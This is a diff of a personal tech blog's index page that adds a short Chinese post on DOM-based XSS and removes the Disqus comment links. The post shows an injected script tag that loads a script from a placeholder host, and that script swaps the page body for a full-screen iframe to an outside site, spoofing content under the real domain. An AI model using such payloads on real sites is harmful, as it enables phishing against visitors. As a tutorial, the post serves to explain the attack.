@@ -9,8 +9,8 @@
   <meta name="author" content="jason">
 
   
-  <meta name="description" content="
-">
+  <meta name="description" content="因为JavaScript脚本功能强大，我们可以利用它来更改整个页面内容，所以我们就可以制造出利用真的目标域名的假页面 page解码后为 1
+&lt;script src=&quot;http://xxxx.com/yy.js&quot;&gt;&lt;/script&gt; yy.js的内容 1 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -96,15 +96,41 @@ $(document).bind('DOMNodeInserted', function(event) {
 
 <time class='entry-date' datetime='2016-08-03T11:04:09+08:00'><span class='date'>2016 年8 月3 日</span> <span class='time'>11:04 am</span></time>
         
-           | <a href="/blog/dom-xss.html#disqus_thread"
-             data-disqus-identifier="http://jason5.cn/blog/dom-xss.html">Comments</a>
-        
       </p>
     
   </header>
 
 
-  <div class="entry-content">
+  <div class="entry-content"><p>因为JavaScript脚本功能强大，我们可以利用它来更改整个页面内容，所以我们就可以制造出利用真的目标域名的假页面</p>
+
+<p><img src="http://jason5.cn/images/xss-dom.png" alt="" /></p>
+
+<p>page解码后为</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&quot;http://xxxx.com/yy.js&quot;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>yy.js的内容</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span><span class="p">(){</span>
+</span><span class='line'>  <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">title</span><span class="o">=</span><span class="s2">&quot;XSS test&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">bgColor</span><span class="o">=</span><span class="s2">&quot;black&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">fgColor</span><span class="o">=</span><span class="s2">&quot;white&quot;</span><span class="p">;</span>
+</span><span class='line'>    <span class="nx">parent</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="o">=</span><span class="s2">&quot;&lt;iframe src=&#39;http://www.qqdx.albbz.cn/&#39; width=&#39;100%&#39; height=&#39;100%&#39;&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>原始页面内容
+<img src="http://jason5.cn/images/xss-dom1.png" alt="" /></p>
 </div>
   
   
@@ -127,9 +153,6 @@ $(document).bind('DOMNodeInserted', function(event) {
 
 
 <time class='entry-date' datetime='2016-08-01T20:18:08+08:00'><span class='date'>2016 年8 月1 日</span> <span class='time'>8:18 pm</span></time>
-        
-           | <a href="/blog/fan-she-xing-xss.html#disqus_thread"
-             data-disqus-identifier="http://jason5.cn/blog/fan-she-xing-xss.html">Comments</a>
         
       </p>
     
@@ -174,9 +197,6 @@ $(document).bind('DOMNodeInserted', function(event) {
 
 
 <time class='entry-date' datetime='2016-07-21T19:48:15+08:00'><span class='date'>2016 年7 月21 日</span> <span class='time'>7:48 pm</span></time>
-        
-           | <a href="/blog/cardviewzai-api-21yi-xia-de-yuan-jiao-xiao-guo-chu-li.html#disqus_thread"
-             data-disqus-identifier="http://jason5.cn/blog/cardviewzai-api-21yi-xia-de-yuan-jiao-xiao-guo-chu-li.html">Comments</a>
         
       </p>
     
@@ -241,9 +261,6 @@ compile 'com.android.support:cardview-v7:23.1.1'
 
 <time class='entry-date' datetime='2016-07-21T19:20:44+08:00'><span class='date'>2016 年7 月21 日</span> <span class='time'>7:20 pm</span></time>
         
-           | <a href="/blog/ru-he-yong-charlesjin-xing-httpszhua-bao.html#disqus_thread"
-             data-disqus-identifier="http://jason5.cn/blog/ru-he-yong-charlesjin-xing-httpszhua-bao.html">Comments</a>
-        
       </p>
     
   </header>
@@ -277,9 +294,6 @@ compile 'com.android.support:cardview-v7:23.1.1'
 
 
 <time class='entry-date' datetime='2015-12-17T19:56:01+08:00'><span class='date'>2015 年12 月17 日</span> <span class='time'>7:56 pm</span></time>
-        
-           | <a href="/blog/yong-c-plus-plus-bian-xie-phpkuo-zhan.html#disqus_thread"
-             data-disqus-identifier="http://jason5.cn/blog/yong-c-plus-plus-bian-xie-phpkuo-zhan.html">Comments</a>
         
       </p>
     
@@ -317,9 +331,6 @@ compile 'com.android.support:cardview-v7:23.1.1'
 
 <time class='entry-date' datetime='2015-08-02T16:27:32+08:00'><span class='date'>2015 年8 月2 日</span> <span class='time'>4:27 pm</span></time>
         
-           | <a href="/blog/shadowsocksshang-wang-gong-lue.html#disqus_thread"
-             data-disqus-identifier="http://jason5.cn/blog/shadowsocksshang-wang-gong-lue.html">Comments</a>
-        
       </p>
     
   </header>
@@ -353,9 +364,6 @@ compile 'com.android.support:cardview-v7:23.1.1'
 
 
 <time class='entry-date' datetime='2015-07-26T11:25:29+08:00'><span class='date'>2015 年7 月26 日</span> <span class='time'>11:25 am</span></time>
-        
-           | <a href="/blog/greendaoshi-yong-ru-men.html#disqus_thread"
-             data-disqus-identifier="http://jason5.cn/blog/greendaoshi-yong-ru-men.html">Comments</a>
         
       </p>
     
@@ -404,9 +412,6 @@ compile 'com.android.support:cardview-v7:23.1.1'
 
 <time class='entry-date' datetime='2015-07-21T22:14:36+08:00'><span class='date'>2015 年7 月21 日</span> <span class='time'>10:14 pm</span></time>
         
-           | <a href="/blog/markdownxue-xi.html#disqus_thread"
-             data-disqus-identifier="http://jason5.cn/blog/markdownxue-xi.html">Comments</a>
-        
       </p>
     
   </header>
@@ -445,9 +450,6 @@ compile 'com.android.support:cardview-v7:23.1.1'
 
 <time class='entry-date' datetime='2015-07-21T12:26:37+08:00'><span class='date'>2015 年7 月21 日</span> <span class='time'>12:26 pm</span></time>
         
-           | <a href="/blog/hello-world.html#disqus_thread"
-             data-disqus-identifier="http://jason5.cn/blog/hello-world.html">Comments</a>
-        
       </p>
     
   </header>
@@ -477,7 +479,7 @@ compile 'com.android.support:cardview-v7:23.1.1'
   <ul id="categories">
     <li class='category'><a href='/blog/categories/android/'>android (2)</a></li>
 <li class='category'><a href='/blog/categories/other/'>other (3)</a></li>
-<li class='category'><a href='/blog/categories/security/'>security (1)</a></li>
+<li class='category'><a href='/blog/categories/security/'>security (2)</a></li>
 <li class='category'><a href='/blog/categories/web/'>web (1)</a></li>
 
   </ul>
@@ -525,19 +527,6 @@ compile 'com.android.support:cardview-v7:23.1.1'
 
 </footer>
   
-
-<script type="text/javascript">
-      var disqus_shortname = 'jason5';
-      
-        
-        var disqus_script = 'count.js';
-      
-    (function () {
-      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
-      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    }());
-</script>
 
 
 
